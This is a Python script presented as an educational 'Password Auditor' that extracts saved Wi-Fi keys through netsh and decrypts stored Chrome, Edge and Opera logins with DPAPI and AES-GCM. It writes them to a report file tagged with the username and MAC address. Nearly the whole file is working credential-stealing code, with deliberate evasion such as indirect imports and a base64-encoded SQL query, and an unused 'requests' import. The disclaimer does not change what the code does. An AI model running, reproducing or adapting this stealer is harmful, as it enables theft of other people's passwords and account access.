"""
PASSWORD AUDITOR - Educational Credential & Wi-Fi Recovery Tool

Author(s): G Abhiram, Chirag Anil Ramamurthy,
Contributer: Prabhav M Naik

DISCLAIMER:
This tool is strictly for educational purposes only. It is intended to demonstrate how
locally stored credentials and Wi-Fi passwords can be accessed on a Windows system
that the user owns and has permission to audit. The authors do not condone or support
any form of malicious activity using this code. We are not responsible for any misuse
or illegal use of this script.
"""
# --------------------------------------
# Fancy Intro Banner
# --------------------------------------
print("""
\n\n██████╗  █████╗ ███████╗███████╗ ██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗╚══███╔╝██╔════╝██╔═══██╗██║   ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██████╔╝███████║  ███╔╝ █████╗  ██║   ██║██║   ██║██████╔╝   ██║   ██║   ██║██████╔╝
██╔═══╝ ██╔══██║ ███╔╝  ██╔══╝  ██║▄▄ ██║██║   ██║██╔═══╝    ██║   ██║   ██║██╔═══╝ 
██║     ██║  ██║███████╗███████╗╚██████╔╝╚██████╔╝██║        ██║   ╚██████╔╝██║     
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══▀▀═╝  ╚═════╝ ╚═╝        ╚═╝    ╚═════╝ ╚═╝     
                                                                                  
            Version 1.0 - Educational Use Only
""")
print("Loading Password Auditor modules...\n")

# -----------------------------
# Dynamic Importing
# -----------------------------
def get_import(name):
    builtins_obj = globals()["__builtins__"]
    if isinstance(builtins_obj, dict):
        importer = builtins_obj["__import__"]
    else:
        importer = builtins_obj.__import__
    return importer(name, fromlist=["*"])
from syscalls import decrypt_dpapi


sqlite3 = get_import("sqlite3")
json = get_import("json")
base64 = get_import("base64")
AES_module = get_import("Cryptodome.Cipher.AES")
subprocess = get_import("subprocess")
os = get_import("os")
pad = get_import("Crypto.Util.Padding").pad
b64encode = get_import("base64").b64encode
b64decode = get_import("base64").b64decode
requests = get_import("requests")
shutil = get_import("shutil")
time = get_import("time")
ciphers_mod = get_import("cryptography.hazmat.primitives.ciphers")
backends_mod = get_import("cryptography.hazmat.backends")

Cipher = getattr(ciphers_mod, "Cipher")
algorithms = getattr(ciphers_mod, "algorithms")
modes = getattr(ciphers_mod, "modes")
default_backend = getattr(backends_mod, "default_backend")

# --------------------------------------
# Resolve current username and MAC address
# --------------------------------------
response = subprocess.run("cd", capture_output=True, text=True, shell=True)
response = response.stdout.replace("\n", "")
x = response.split("\\")
name = x[2] if len(x) >= 3 else "UnknownUser"

mac = "UNKNOWN_MAC"
command = "ipconfig/all"
result = subprocess.run(command, capture_output=True, text=True, shell=True)
interfaces = result.stdout.split('\n\n')
for section in interfaces:
    if 'Wireless LAN adapter Wi-Fi:' in section:
        lines = section.split('\n')
        for line in lines:
            if "Physical Address" in line:
                mac = line.split(":")[-1].strip()
                break

name += f"_{mac.replace('-', '')}"

# -----------------------------
# In-memory SQLite loader (uses backup to preserve binary blobs)
# -----------------------------
def load_db_in_memory(db_path):
    disk_conn = sqlite3.connect(f'file:{db_path}?mode=ro', uri=True)
    mem_conn = sqlite3.connect(":memory:")
    disk_conn.backup(mem_conn)   
    disk_conn.close()
    return mem_conn


# ------------------------
# Generic AES-GCM decrypt 
# ------------------------
def generic_decrypt(ciphertext, key, iv, tag):
    cipher = Cipher(
        algorithms.AES(key),
        modes.GCM(iv, tag),
        backend=default_backend()
    )
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

# -----------------------------
# Browser Password Extraction
# -----------------------------
def extract_browser_passwords(browser_name, login_data_path, local_state_path):
    output = []
    try:
        if not os.path.exists(login_data_path) or not os.path.exists(local_state_path):
            return [f"{browser_name}: Login Data or Local State not found.\n"]

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        master_key = decrypt_dpapi(encrypted_key)

        temp_db = f"login_data_{browser_name.lower()}.db"
        shutil.copy2(login_data_path, temp_db)

        memcon = load_db_in_memory(temp_db)
        cursor = memcon.cursor()

        # --- Obfuscated SQL query ---
        encoded_query = base64.b64encode(
            b'SELECT origin_url, username_value, password_value FROM logins'
        ).decode()
        query = base64.b64decode(encoded_query).decode("utf-8")
        cursor.execute(query)

        for url, username, encrypted_password in cursor.fetchall():
            if not encrypted_password:
                continue
            try:
                # --- AES-GCM Case ---
                if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                    iv = encrypted_password[3:15]
                    ciphertext = encrypted_password[15:-16]
                    tag = encrypted_password[-16:]

                    decrypted_bytes = generic_decrypt(ciphertext, master_key, iv, tag)
                    decrypted = decrypted_bytes.decode("utf-8", errors="ignore")

                # --- Legacy DPAPI ---
                else:
                    dpapi_bytes = decrypt_dpapi(encrypted_password)
                    if isinstance(dpapi_bytes, (bytes, bytearray)):
                        decrypted = dpapi_bytes.decode("utf-8", errors="ignore")
                    else:
                        decrypted = str(dpapi_bytes)

            except Exception as e:
                decrypted = f"<decryption failed: {str(e)}>"

            output.append(f"{url}\n{username}:{decrypted}\n")

        cursor.close()
        memcon.close()
        os.remove(temp_db)

    except Exception as e:
        output.append(f"Failed to extract from {browser_name}: {str(e)}\n")

    return output

# -----------------------------
# Wi-Fi Password Extraction
# -----------------------------
def extract_wifi_passwords():
    ET = get_import("xml.etree.ElementTree")

    wifi_details = []
    export_cmd = f"netsh wlan export profile key=clear"
    subprocess.run(export_cmd, capture_output=True, text=True, shell=True)

    files = [f for f in os.listdir(".") if f.startswith('Wi-Fi') and f.endswith('.xml')]
    ns = {'ns': 'http://www.microsoft.com/networking/WLAN/profile/v1'}

    for file in files:
        try:
            tree = ET.parse(file)
            root = tree.getroot()
            ssid = root.find('ns:name', ns).text
            key = root.find('.//ns:keyMaterial', ns)
            password = key.text if key is not None else '[OPEN]'
            wifi_details.append(f"{ssid} : {password}")
        except Exception as e:
            wifi_details.append(f"{file} : Error - {str(e)}")

        try:
            os.remove(file)
        except:
            pass

    return wifi_details

# -----------------------------
# MAIN
# -----------------------------
if __name__ == "__main__":
    os = get_import("os")

    all_output = []

    all_output.append("Wi-Fi Profiles and Passwords ===\n")
    wifi_data = extract_wifi_passwords()
    all_output.extend([f + "\n" for f in wifi_data])

    all_output.append("\n=== Chrome Saved Logins ===\n")
    all_output.extend(extract_browser_passwords(
        "Chrome",
        os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data'),
        os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State')
    ))

    all_output.append("\n=== Edge Saved Logins ===\n")
    all_output.extend(extract_browser_passwords(
        "Edge",
        os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'),
        os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Local State')
    ))

    all_output.append("\n=== Opera Saved Logins ===\n")
    all_output.extend(extract_browser_passwords(
        "Opera",
        os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable\Login Data'),
        os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable\Local State')
    ))

# --------------------------------------
# Clean Up Exported XML Files
# --------------------------------------
try:
    for file in os.listdir(response):
        if file.startswith("Wi-Fi") and file.endswith(".xml"):
            os.remove(os.path.join(response, file))
except:
    pass
# Save Results Locally
final_report = f"{name}_report.txt"
with open(final_report, 'w', encoding='utf-8') as report_file:
    report_file.writelines(all_output)

print(f"\n[✔] Report generated: {final_report}\n")
print("NOTE: This report contains sensitive information. Handle it securely.\n")
